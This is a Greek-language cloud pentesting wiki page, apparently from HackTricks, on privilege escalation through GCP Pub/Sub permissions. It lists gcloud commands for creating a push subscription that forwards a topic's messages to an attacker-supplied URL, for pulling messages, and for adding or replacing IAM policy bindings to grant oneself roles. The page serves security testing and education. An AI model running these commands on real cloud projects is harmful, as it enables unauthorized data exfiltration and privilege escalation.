# GCP - Pubsub Privesc

{{#include ../../../banners/hacktricks-training.md}}

## PubSub

Περισσότερες πληροφορίες στο:

{{#ref}}
../gcp-services/gcp-pub-sub.md
{{#endref}}

### `pubsub.snapshots.create` (`pubsub.topics.attachSubscription`)

Τα snapshots των topics **περιέχουν τα τρέχοντα unACKed messages και κάθε επόμενο μήνυμα**. Μπορείτε να δημιουργήσετε ένα snapshot ενός topic για να **έχετε πρόσβαση σε όλα τα μηνύματα**, **αποφεύγοντας την άμεση πρόσβαση στο topic**.
```bash
gcloud pubsub subscriptions create <subscription_name> --topic <topic_name> --push-endpoint https://<URL_to_push_to>
```
### **`pubsub.snapshots.setIamPolicy`**

Αναθέτει σε εσάς τα προηγούμενα δικαιώματα.

### `pubsub.subscriptions.create`

Μπορείτε να δημιουργήσετε ένα push subscription σε ένα topic που θα στέλνει όλα τα ληφθέντα μηνύματα στην υποδεικνυόμενη URL

### **`pubsub.subscriptions.update`**

Ορίστε τη δική σας URL ως push endpoint για να κλέψετε τα μηνύματα.

### `pubsub.subscriptions.consume`

Πρόσβαση στα μηνύματα χρησιμοποιώντας τη subscription.
```bash
gcloud pubsub subscriptions pull <SUSCRIPTION> \
--limit=50 \
--format="json" \
--project=<PROJECTID>
```
### `pubsub.subscriptions.setIamPolicy`

Δώστε στον εαυτό σας οποιοδήποτε από τα προηγούμενα δικαιώματα
```bash
# Add Binding
gcloud pubsub subscriptions add-iam-policy-binding <SUSCRIPTION_NAME> \
--member="serviceAccount:<SA_NAME>@<PROJECT_ID>.iam.gserviceaccount.com" \
--role="<ROLE_OR_CUSTOM_ROLE>" \
--project="<PROJECT_ID>"

# Remove Binding
gcloud pubsub subscriptions remove-iam-policy-binding <SUSCRIPTION_NAME> \
--member="serviceAccount:<SA_NAME>@<PROJECT_ID>.iam.gserviceaccount.com" \
--role="<ROLE_OR_CUSTOM_ROLE>" \
--project="<PROJECT_ID>"

# Change Policy
gcloud pubsub subscriptions set-iam-policy <SUSCRIPTION_NAME> \
<(echo '{
"bindings": [
{
"role": "<ROLE_OR_CUSTOM_ROLE>",
"members": [
"serviceAccount:<SA_NAME>@<PROJECT_ID>.iam.gserviceaccount.com"
]
}
]
}') \
--project=<PROJECT_ID>
```
{{#include ../../../banners/hacktricks-training.md}}
